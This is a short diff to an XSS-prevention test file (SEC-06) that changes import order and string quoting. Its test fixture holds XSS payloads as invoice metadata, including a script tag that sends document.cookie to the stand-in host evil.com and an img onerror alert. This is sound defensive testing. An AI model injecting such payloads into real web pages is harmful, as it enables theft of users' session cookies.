@@ -1,4 +1,4 @@
-import { describe, it, expect } from 'vitest';
+import { describe, expect, it } from 'vitest';
 
 describe('XSS Prevention — SEC-06', () => {
   it('should store HTML/script in client name as literal text', () => {
@@ -27,8 +27,8 @@ describe('XSS Prevention — SEC-06', () => {
     // Given an invoice with metadata containing JavaScript
     const maliciousMetadata = {
       note: "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
-      css: "<style>body{display:none}</style>",
-      img: "<img src=x onerror=alert(1)>",
+      css: '<style>body{display:none}</style>',
+      img: '<img src=x onerror=alert(1)>',
     };
 
     // When storing and retrieving via API (JSON serialization roundtrip)
